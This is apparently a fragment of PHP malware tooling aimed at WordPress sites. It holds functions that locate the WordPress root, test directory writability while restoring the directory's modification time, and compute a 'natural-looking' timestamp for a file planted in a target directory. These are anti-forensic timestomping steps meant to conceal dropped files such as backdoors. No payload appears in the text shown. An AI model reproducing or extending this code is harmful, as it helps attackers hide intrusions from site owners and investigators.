/**
 * Find WordPress root by walking up from current directory
 */
function _find_wp_root() {
    $dir = __DIR__;
    for ($i = 0; $i < 10; $i++) {
        $test = $dir . '/wp-load.php';
        if (file_exists($test)) return $dir;
        $parent = dirname($dir);
        if ($parent === $dir) break;
        $dir = $parent;
    }
    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        $test = $_SERVER['DOCUMENT_ROOT'] . '/wp-load.php';
        if (file_exists($test)) return $_SERVER['DOCUMENT_ROOT'];
    }
    return null;
}

/**
 * Test if a directory is writable, restoring its mtime after the check
 */
function _dir_writable($dir) {
    if (!is_dir($dir)) return false;
    $test = $dir . '/.' . md5($dir . uniqid()) . '.w';
    $ok = @file_put_contents($test, '1') !== false;
    if ($ok) {
        @unlink($test);
        @touch($dir, filemtime($dir));
    }
    return $ok;
}

/**
 * Get a natural-looking mtime for a file placed in the target directory
 */
function _get_natural_mtime($dir) {
    $mtimes = [];
    $files = glob("$dir/*.php") ?: glob("$dir/*") ?: [];
    $files = is_array($files) ? $files : [];
    $sample = array_slice($files, 0, 20);

    foreach ($sample as $f) {
        $m = @filemtime($f);
        if ($m) $mtimes[] = $m;
    }

    if (!empty($mtimes)) {
        sort($mtimes);
        return $mtimes[floor(count($mtimes) / 2)] + rand(-3600, 3600);
    }

    $dm = @filemtime($dir);
    if ($dm) return $dm + rand(-3600, 3600);

    return time() - rand(7776000, 15552000);
}

